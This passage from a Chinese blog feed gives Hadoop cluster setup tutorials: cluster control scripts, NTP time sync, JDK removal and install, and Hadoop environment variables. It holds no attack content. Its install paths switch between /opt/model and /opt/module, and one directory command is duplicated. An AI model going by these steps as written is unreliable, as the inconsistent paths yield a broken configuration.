class="line">&quot;start&quot;)</span><br><span class="line">        echo &quot;====== 启动 hadoop 集群 ======&quot;</span><br><span class="line"></span><br><span class="line">        echo &quot;------ 启动 hdfs ------&quot;</span><br><span class="line">        ssh hadoop100 &quot;/opt/module/hadoop-3.3.4/sbin/start-dfs.sh&quot;</span><br><span class="line">        echo &quot;------ 启动 yarn ------&quot;</span><br><span class="line">        ssh hadoop101 &quot;/opt/module/hadoop-3.3.4/sbin/start-yarn.sh&quot;</span><br><span class="line">        echo &quot;------ 启动 historyserver ------&quot;</span><br><span class="line">        ssh hadoop100 &quot;/opt/module/hadoop-3.3.4/bin/mapred --daemon start historyserver&quot;</span><br><span class="line">;;</span><br><span class="line">&quot;stop&quot;)</span><br><span class="line">        echo &quot;====== 关闭 hadoop 集群 ======&quot;</span><br><span class="line"></span><br><span class="line">        echo &quot;------ 关闭 historyserver ------&quot;</span><br><span class="line">        ssh hadoop100 &quot;/opt/module/hadoop-3.3.4/bin/mapred --daemon stop historyserver&quot;</span><br><span class="line">        echo &quot;------ 关闭 yarn ------&quot;</span><br><span class="line">        ssh hadoop101 &quot;/opt/module/hadoop-3.3.4/sbin/stop-yarn.sh&quot;</span><br><span class="line">        echo &quot;------ 关闭 hdfs ------&quot;</span><br><span class="line">        ssh hadoop100 &quot;/opt/module/hadoop-3.3.4/sbin/stop-dfs.sh&quot;</span><br><span class="line">;;</span><br><span class="line">*)</span><br><span class="line">        echo &quot;参数错误！&quot;</span><br><span class="line">;;</span><br><span class="line">esac</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ghost@hadoop100 bin]$ chmod +x myhadoop.sh</span><br></pre></td></tr></table></figure><h3 id="（2）查看三台服务器-Java-进程脚本：jpsall"><a href="#（2）查看三台服务器-Java-进程脚本：jpsall" class="headerlink" title="（2）查看三台服务器 Java 进程脚本：jpsall"></a>（2）查看三台服务器 Java 进程脚本：jpsall</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[ghost@hadoop100 bin]$ vim jpsall</span><br><span class="line">[ghost@hadoop100 bin]$ pwd</span><br><span class="line">/home/ghost/bin</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">for host in hadoop100 hadoop101 hadoop102</span><br><span class="line">do</span><br><span class="line">        echo ====== $host ======</span><br><span class="line">        ssh $host jps</span><br><span class="line">done</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ghost@hadoop100 bin]$ chmod +x jpsall </span><br></pre></td></tr></table></figure><h3 id="（3）分发-x2F-home-x2F-ghost-x2F-bin-目录，保证自定义脚本在三台机器上都可以使用"><a href="#（3）分发-x2F-home-x2F-ghost-x2F-bin-目录，保证自定义脚本在三台机器上都可以使用" class="headerlink" title="（3）分发&#x2F;home&#x2F;ghost&#x2F;bin 目录，保证自定义脚本在三台机器上都可以使用"></a>（3）分发&#x2F;home&#x2F;ghost&#x2F;bin 目录，保证自定义脚本在三台机器上都可以使用</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ghost@hadoop100 hadoop-3.3.4]$ xsync /home/ghost/bin/</span><br></pre></td></tr></table></figure><h2 id="3-10-常用端口号说明"><a href="#3-10-常用端口号说明" class="headerlink" title="3.10 常用端口号说明"></a>3.10 常用端口号说明</h2><p><img src="/blog/6ae4aefa.html/image-20221214145200814.png"></p><h2 id="3-11-集群时间同步"><a href="#3-11-集群时间同步" class="headerlink" title="3.11 集群时间同步"></a>3.11 集群时间同步</h2><ul><li>如果服务器在公网环境（能连接外网），可以不采用集群时间同步，因为服务器会定期 和公网时间进行校准； </li><li>如果服务器在内网环境，必须要配置集群时间同步，否则时间久了，会产生时间偏差， 导致集群执行任务时间不同步。</li></ul><h3 id="（1）需求"><a href="#（1）需求" class="headerlink" title="（1）需求"></a>（1）需求</h3><ul><li>找一个机器，作为时间服务器，所有的机器与这台集群时间进行定时的同步，生产环境 根据任务对时间的准确程度要求周期同步。</li><li>此处测试环境为了尽快看到效果，采用 1 分钟同步一 次。</li></ul><p><img src="/blog/6ae4aefa.html/image-20221214153230399.png"></p><h3 id="（2）时间服务器配置，必须使用root配置"><a href="#（2）时间服务器配置，必须使用root配置" class="headerlink" title="（2）时间服务器配置，必须使用root配置"></a>（2）时间服务器配置，必须使用root配置</h3><ul><li>查看所有节点 ntpd 服务状态和开机自启动状态</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[ghost@hadoop100 ~]$ sudo systemctl status ntpd</span><br><span class="line">[ghost@hadoop100 ~]$ sudo systemctl start ntpd</span><br><span class="line">[ghost@hadoop100 ~]$ sudo systemctl is-enabled ntpd</span><br><span class="line">disabled</span><br></pre></td></tr></table></figure><ul><li><p>修改 hadoop100 的 ntp.conf 配置文件</p><ul><li><p>修改 1（授权 172.31.58.0-172.31.58.255 网段上的所有机器可以从这台机器上查询和同步时间）</p></li><li><pre><code># 授权 172.31.58.0-172.31.58.255 网段上的所有机器可以从这台机器上查询和同步时间restrict 172.31.58.0 mask 255.255.255.0 nomodify notrap<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 修改 2（集群在局域网中，不使用其他互联网上的时间）</span><br><span class="line"></span><br><span class="line">- ```</span><br><span class="line">  # 全部注释，集群在局域网中，不使用其他互联网上的时间</span><br><span class="line">  #server 0.centos.pool.ntp.org iburst</span><br><span class="line">  #server 1.centos.pool.ntp.org iburst</span><br><span class="line">  #server 2.centos.pool.ntp.org iburst</span><br><span class="line">  #server 3.centos.pool.ntp.org iburst</span><br></pre></td></tr></table></figure></code></pre></li><li><p>添加 3（当该节点丢失网络连接，依然可以采用本地时间作为时间服务器为集群中的其他节点提供时间同步）</p></li><li><p>&#96;&#96;&#96;</p><h1 id="当该节点丢失网络连接，依然可以采用本地时间作为时间服务器为集群中的其他节点提供时间同步"><a href="#当该节点丢失网络连接，依然可以采用本地时间作为时间服务器为集群中的其他节点提供时间同步" class="headerlink" title="当该节点丢失网络连接，依然可以采用本地时间作为时间服务器为集群中的其他节点提供时间同步"></a>当该节点丢失网络连接，依然可以采用本地时间作为时间服务器为集群中的其他节点提供时间同步</h1><p>server 127.127.1.0<br>fudge 127.127.1.0 stratum 10</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 修改 hadoop100 的/etc/sysconfig/ntpd 文件（让硬件时间与系统时间一起同步）</span><br><span class="line"></span><br><span class="line">- ```</span><br><span class="line">  [root@hadoop100 ghost]# vim /etc/sysconfig/ntpd</span><br></pre></td></tr></table></figure></li></ul></li><li><pre><code># 增加以下内容，让硬件时间与系统时间一起同步SYNC_HWCLOCK=yes<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 重新启动 ntpd 服务</span><br><span class="line"></span><br><span class="line">- ```</span><br><span class="line">  [root@hadoop100 ghost]# sudo systemctl restart ntpd</span><br></pre></td></tr></table></figure></code></pre></li><li><p>设置 ntpd 服务开机启动</p></li><li><pre><code>[root@hadoop100 ghost]# sudo systemctl enable ntpdCreated symlink from /etc/systemd/system/multi-user.target.wants/ntpd.service to /usr/lib/systemd/system/ntpd.service.<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### （3）时间服务器配置，必须使用root配置</span><br><span class="line"></span><br><span class="line">- 关闭所有节点上 ntp 服务和自启动</span><br><span class="line"></span><br><span class="line">- ```</span><br><span class="line">  [ghost@hadoop101 hadoop-3.3.4]$ sudo systemctl status ntpd</span><br><span class="line">  [ghost@hadoop101 hadoop-3.3.4]$ sudo systemctl stop ntpd</span><br><span class="line">  [ghost@hadoop101 hadoop-3.3.4]$ sudo systemctl disable ntpd</span><br><span class="line">  [ghost@hadoop102 hadoop-3.3.4]$ sudo systemctl stop ntpd</span><br><span class="line">  [ghost@hadoop102 hadoop-3.3.4]$ sudo systemctl disable ntpd</span><br></pre></td></tr></table></figure></code></pre></li><li><p>在其他机器配置 1 分钟与时间服务器同步一次</p></li><li><pre><code class="shell"># 编写定时任务[ghost@hadoop101 hadoop-3.3.4]$ crontab -e*/1 * * * * /usr/sbin/ntpdate hadoop100[ghost@hadoop102 hadoop-3.3.4]$ crontab -e*/1 * * * * /usr/sbin/ntpdate hadoop100<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 修改任意机器时间</span><br><span class="line"></span><br><span class="line">- ```</span><br><span class="line">  [ghost@hadoop102 hadoop-3.3.4]$ sudo date -s &quot;2023-3-1 12:00:00&quot;</span><br><span class="line">  2023年 03月 01日 星期三 12:00:00 CST</span><br></pre></td></tr></table></figure></code></pre></li><li><p>1 分钟后查看机器是否与时间服务器同步</p></li><li><pre><code>[ghost@hadoop102 ~]$ sudo date2022年 12月 14日 星期三 16:10:35 CST</code></pre></li></ul><h1 id="四：常见错误及解决方案"><a href="#四：常见错误及解决方案" class="headerlink" title="四：常见错误及解决方案"></a>四：常见错误及解决方案</h1><h2 id="4-1-常见问题"><a href="#4-1-常见问题" class="headerlink" title="4.1 常见问题"></a>4.1 常见问题</h2><ul><li>防火墙没关闭、或者没有启动 YARN</li><li>主机名称配置错误</li><li>IP 地址配置错误</li><li>ssh 没有配置好</li><li>root 用户和 ghost 两个用户启动集群不统一</li><li>配置文件修改出错</li><li>不识别主机名称</li></ul><h2 id="4-2-解决方案"><a href="#4-2-解决方案" class="headerlink" title="4.2 解决方案"></a>4.2 解决方案</h2><h3 id="（1）DataNode-和-NameNode-进程同时只能工作一个"><a href="#（1）DataNode-和-NameNode-进程同时只能工作一个" class="headerlink" title="（1）DataNode 和 NameNode 进程同时只能工作一个"></a>（1）DataNode 和 NameNode 进程同时只能工作一个</h3><p><img src="/blog/6ae4aefa.html/image-20221214161451221.png"></p><h3 id="（2）jps-发现进程已经没有，但是重新启动集群，提示进程已经开启。"><a href="#（2）jps-发现进程已经没有，但是重新启动集群，提示进程已经开启。" class="headerlink" title="（2）jps 发现进程已经没有，但是重新启动集群，提示进程已经开启。"></a>（2）jps 发现进程已经没有，但是重新启动集群，提示进程已经开启。</h3><ul><li>原因是在 Linux 的根目录下&#x2F;tmp 目录中存在启动的进程临时文件，将集群相关进程删 除掉，再重新启动集群。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Hadoop </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hadoop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hadoop 运行环境搭建</title>
      <link href="/blog/bee3736a.html/"/>
      <url>/blog/bee3736a.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：模板虚拟机准备"><a href="#一：模板虚拟机准备" class="headerlink" title="一：模板虚拟机准备"></a>一：模板虚拟机准备</h1><h2 id="1-1-安装模板虚拟机"><a href="#1-1-安装模板虚拟机" class="headerlink" title="1.1 安装模板虚拟机"></a>1.1 安装模板虚拟机</h2><p>IP 地址 192.31.58.100、主机名称 hadoop100、内存 4G、硬盘 40G，采用CentOS-7-x86_64-DVD-2009_2.iso镜像。</p><h2 id="1-2-查看网络情况"><a href="#1-2-查看网络情况" class="headerlink" title="1.2 查看网络情况"></a>1.2 查看网络情况</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 ~]# ping baidu.com</span><br><span class="line">PING baidu.com (110.242.68.66) 56(84) bytes of data.</span><br><span class="line">64 bytes from 110.242.68.66 (110.242.68.66): icmp_seq=1 ttl=128 time=26.3 ms</span><br><span class="line">64 bytes from 110.242.68.66 (110.242.68.66): icmp_seq=2 ttl=128 time=26.7 ms</span><br><span class="line">64 bytes from 110.242.68.66 (110.242.68.66): icmp_seq=3 ttl=128 time=24.7 ms</span><br><span class="line">^C</span><br><span class="line">--- baidu.com ping statistics ---</span><br><span class="line">3 packets transmitted, 3 received, 0% packet loss, time 6095ms</span><br><span class="line">rtt min/avg/max/mdev = 24.764/25.943/26.736/0.870 ms</span><br></pre></td></tr></table></figure><h2 id="1-3-安装-epel-release"><a href="#1-3-安装-epel-release" class="headerlink" title="1.3 安装 epel-release"></a>1.3 安装 epel-release</h2><p>Extra Packages for Enterprise Linux 是为“红帽系”的操作系统提供额外的软件包，适用于 RHEL、CentOS 和 Scientific Linux。相当于是一个软件仓库，大多数 rpm 包在官方 repository 中是找不到的。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y epel-release</span><br></pre></td></tr></table></figure><p>若为 Linux 安装的是最小系统版，还需要安装如下工具；如果安装的是 Linux 桌面标准版，不需要执行如下操作：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">net-tool：工具包集合，包含 ifconfig 等命令</span></span><br><span class="line">yum install -y net-tools </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">vim：编辑器</span></span><br><span class="line">yum install -y vim</span><br></pre></td></tr></table></figure><h2 id="1-4-关闭防火墙，关闭防火墙开机自启"><a href="#1-4-关闭防火墙，关闭防火墙开机自启" class="headerlink" title="1.4 关闭防火墙，关闭防火墙开机自启"></a>1.4 关闭防火墙，关闭防火墙开机自启</h2><p>在企业开发时，通常单个服务器的防火墙是关闭的，公司整体对外会设置非常安全的防火墙。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 ~]#  systemctl stop firewalld</span><br><span class="line">[root@hadoop100 ~]#  systemctl status firewalld</span><br><span class="line">● firewalld.service - firewalld - dynamic firewall daemon</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/firewalld.service; enabled; vendor preset: enabled)</span><br><span class="line">   Active: inactive (dead) since 二 2022-12-13 10:22:37 CST; 8s ago</span><br><span class="line">     Docs: man:firewalld(1)</span><br><span class="line">  Process: 723 ExecStart=/usr/sbin/firewalld --nofork --nopid $FIREWALLD_ARGS (code=exited, status=0/SUCCESS)</span><br><span class="line"> Main PID: 723 (code=exited, status=0/SUCCESS)</span><br><span class="line"></span><br><span class="line">12月 13 10:13:44 hadoop100 systemd[1]: Starting firewalld - dynamic firewall daemon...</span><br><span class="line">12月 13 10:13:54 hadoop100 systemd[1]: Started firewalld - dynamic firewall daemon.</span><br><span class="line">12月 13 10:13:54 hadoop100 firewalld[723]: WARNING: AllowZoneDrifting is enabled. This is considered an insecure co... now.</span><br><span class="line">12月 13 10:22:36 hadoop100 systemd[1]: Stopping firewalld - dynamic firewall daemon...</span><br><span class="line">12月 13 10:22:37 hadoop100 systemd[1]: Stopped firewalld - dynamic firewall daemon.</span><br><span class="line">Hint: Some lines were ellipsized, use -l to show in full.</span><br></pre></td></tr></table></figure><h2 id="1-5-卸载自带JDK"><a href="#1-5-卸载自带JDK" class="headerlink" title="1.5 卸载自带JDK"></a>1.5 卸载自带JDK</h2><p>如果你的虚拟机是最小化安装不需要执行这一步。</p><p>➢ rpm -qa：查询所安装的所有 rpm 软件包 </p><p>➢ grep -i：忽略大小写 </p><p>➢ xargs -n1：表示每次只传递一个参数 </p><p>➢ rpm -e –nodeps：强制卸载软件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 ~]# rpm -qa | grep -i java</span><br><span class="line">java-1.7.0-openjdk-headless-1.7.0.261-2.6.22.2.el7_8.x86_64</span><br><span class="line">python-javapackages-3.4.1-11.el7.noarch</span><br><span class="line">tzdata-java-2020a-1.el7.noarch</span><br><span class="line">java-1.8.0-openjdk-headless-1.8.0.262.b10-1.el7.x86_64</span><br><span class="line">java-1.8.0-openjdk-1.8.0.262.b10-1.el7.x86_64</span><br><span class="line">javapackages-tools-3.4.1-11.el7.noarch</span><br><span class="line">java-1.7.0-openjdk-1.7.0.261-2.6.22.2.el7_8.x86_64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@hadoop100 ~]# rpm -qa | grep -i java | xargs -n1 rpm -e --nodeps</span><br></pre></td></tr></table></figure><h2 id="1-6-重启虚拟机"><a href="#1-6-重启虚拟机" class="headerlink" title="1.6 重启虚拟机"></a>1.6 重启虚拟机</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 ~]# reboot</span><br></pre></td></tr></table></figure><h1 id="二：克隆虚拟机"><a href="#二：克隆虚拟机" class="headerlink" title="二：克隆虚拟机"></a>二：克隆虚拟机</h1><h2 id="2-1-克隆"><a href="#2-1-克隆" class="headerlink" title="2.1 克隆"></a>2.1 克隆</h2><p>利用模板虚拟机，克隆出hadoop101，hadoop102两台虚拟机；</p><h2 id="2-2-修改ip地址"><a href="#2-2-修改ip地址" class="headerlink" title="2.2 修改ip地址"></a>2.2 修改ip地址</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/sysconfig/network-scripts/ifcfg-ens33</span><br></pre></td></tr></table></figure><h2 id="2-3-修改主机名称"><a href="#2-3-修改主机名称" class="headerlink" title="2.3 修改主机名称"></a>2.3 修改主机名称</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hostnamectl set-hostname hadoop101</span><br></pre></td></tr></table></figure><h2 id="2-4-重启"><a href="#2-4-重启" class="headerlink" title="2.4 重启"></a>2.4 重启</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reboot</span><br></pre></td></tr></table></figure><h1 id="三：模板机安装-JDK"><a href="#三：模板机安装-JDK" class="headerlink" title="三：模板机安装 JDK"></a>三：模板机安装 JDK</h1><h2 id="3-1-上传JDK"><a href="#3-1-上传JDK" class="headerlink" title="3.1 上传JDK"></a>3.1 上传JDK</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">注意：要卸载已有的JDK</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建 /opt/software/ 目录</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建 /opt/model/ 目录</span></span><br><span class="line">mkdir /opt/software/</span><br><span class="line">mkdir /opt/software/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用 xftp 传输 jdk 至 /opt/software/ 目录下</span></span><br><span class="line">[root@hadoop100 software]# pwd</span><br><span class="line">/opt/software</span><br><span class="line">[root@hadoop100 software]# ll</span><br><span class="line">总用量 142112</span><br><span class="line">-rw-r--r--. 1 root root 145520298 12月 13 11:38 jdk-8u301-linux-x64.tar.gz</span><br></pre></td></tr></table></figure><h2 id="3-2-解压JDK"><a href="#3-2-解压JDK" class="headerlink" title="3.2 解压JDK"></a>3.2 解压JDK</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">解压 JDK 到/opt/module 目录下，-C 指定解压路径</span></span><br><span class="line">[root@hadoop100 software]# tar -zxvf jdk-8u301-linux-x64.tar.gz -C /opt/model/</span><br></pre></td></tr></table></figure><h2 id="3-3-配置-JDK-环境变量"><a href="#3-3-配置-JDK-环境变量" class="headerlink" title="3.3 配置 JDK 环境变量"></a>3.3 配置 JDK 环境变量</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在 /etc/profile.d/ 下新建 ghost_env.sh</span></span><br><span class="line">[root@hadoop100 profile.d]# vim ghost_env.sh</span><br><span class="line">[root@hadoop100 profile.d]# cat ghost_env.sh </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">JAVA_HOME</span></span><br><span class="line">export JAVA_HOME=/opt/model/jdk1.8.0_301</span><br><span class="line">export PATH=$PATH:$JAVA_HOME/bin</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重新加载环境变量，让新的环境变量PATH生效</span> </span><br><span class="line">[root@hadoop100 profile.d]# source /etc/profile</span><br></pre></td></tr></table></figure><h2 id="3-4-测试-JDK-是否安装成功"><a href="#3-4-测试-JDK-是否安装成功" class="headerlink" title="3.4 测试 JDK 是否安装成功"></a>3.4 测试 JDK 是否安装成功</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 ~]# java -version</span><br><span class="line">java version &quot;1.8.0_301&quot;</span><br><span class="line">Java(TM) SE Runtime Environment (build 1.8.0_301-b09)</span><br><span class="line">Java HotSpot(TM) 64-Bit Server VM (build 25.301-b09, mixed mode)</span><br></pre></td></tr></table></figure><h1 id="四：模板机安装-Hadoop"><a href="#四：模板机安装-Hadoop" class="headerlink" title="四：模板机安装 Hadoop"></a>四：模板机安装 Hadoop</h1><h2 id="4-1-下载地址"><a href="#4-1-下载地址" class="headerlink" title="4.1 下载地址"></a>4.1 下载地址</h2><p>Hadoop 下载地址：<a href="https://archive.apache.org/dist/hadoop/common/hadoop-3.3.4/">Index of &#x2F;dist&#x2F;hadoop&#x2F;common&#x2F;hadoop-3.3.4 (apache.org)</a></p><h2 id="4-2-上传安装包"><a href="#4-2-上传安装包" class="headerlink" title="4.2 上传安装包"></a>4.2 上传安装包</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 software]# ll</span><br><span class="line">总用量 821272</span><br><span class="line">-rw-r--r--. 1 root root 695457782 12月 13 11:54 hadoop-3.3.4.tar.gz</span><br><span class="line">-rw-r--r--. 1 root root 145520298 12月 13 11:38 jdk-8u301-linux-x64.tar.gz</span><br></pre></td></tr></table></figure><h2 id="4-3-解压安装包"><a href="#4-3-解压安装包" class="headerlink" title="4.3 解压安装包"></a>4.3 解压安装包</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 software]# tar -zxvf hadoop-3.3.4.tar.gz -C /opt/model/</span><br></pre></td></tr></table></figure><h2 id="4-4-查看安装结果"><a href="#4-4-查看安装结果" class="headerlink" title="4.4 查看安装结果"></a>4.4 查看安装结果</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 module]# ll</span><br><span class="line">总用量 0</span><br><span class="line">drwxr-xr-x. 10  1024  1024 215 7月  29 21:44 hadoop-3.3.4</span><br><span class="line">drwxr-xr-x.  8 10143 10143 273 6月   9 2021 jdk1.8.0_301</span><br></pre></td></tr></table></figure><h2 id="4-5-将Hadoop添加到环境变量"><a href="#4-5-将Hadoop添加到环境变量" class="headerlink" title="4.5 将Hadoop添加到环境变量"></a>4.5 将Hadoop添加到环境变量</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取hadoop安装路径</span> </span><br><span class="line">[root@hadoop100 hadoop-3.3.4]# pwd</span><br><span class="line">/opt/module/hadoop-3.3.4</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">打开/etc/profile.d/ghost_env.sh文件,编辑环境变量</span></span><br><span class="line">[root@hadoop100 hadoop-3.3.4]# vim /etc/profile.d/ghost_env.sh </span><br><span class="line">[root@hadoop100 hadoop-3.3.4]# cat /etc/profile.d/ghost_env.sh </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">JAVA_HOME</span></span><br><span class="line">export JAVA_HOME=/opt/module/jdk1.8.0_301</span><br><span class="line">export PATH=$PATH:$JAVA_HOME/bin</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">HADOOP_HOME</span></span><br><span class="line">export HADOOP_HOME=/opt/module/hadoop-3.3.4</span><br><span class="line">export PATH=$PATH:$HADOOP_HOME/bin</span><br><span class="line">export PATH=$PATH:$HADOOP_HOME/sbin</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使环境变量生效</span></span><br><span class="line">[root@hadoop100 ~]# source /etc/profile</span><br></pre></td></tr></table></figure><h2 id="4-6-测试是否安装成功"><a href="#4-6-测试是否安装成功" class="headerlink" title="4.6 测试是否安装成功"></a>4.6 测试是否安装成功</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 ~]# hadoop version</span><br><span class="line">Hadoop 3.3.4</span><br><span class="line">Source code repository https://github.com/apache/hadoop.git -r a585a73c3e02ac62350c136643a5e7f6095a3dbb</span><br><span class="line">Compiled by stevel on 2022-07-29T12:32Z</span><br><span class="line">Compiled with protoc 3.7.1</span><br><span class="line">From source with checksum fb9dd8918a7b8a5b430d61af858f6ec</span><br><span class="line">This command was run using /opt/model/hadoop-3.3.4/share/hadoop/common/hadoop-common-3.3.4.jar</span><br></pre></td></tr></table></figure><h1 id="五：Hadoop目录结构"><a href="#五：Hadoop目录结构" class="headerlink" title="五：Hadoop目录结构"></a>五：Hadoop目录结构</h1><h2 id="5-1-查看hadoop目录结构"><a href="#5-1-查看hadoop目录结构" class="headerlink" title="5.1 查看hadoop目录结构"></a>5.1 查看hadoop目录结构</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 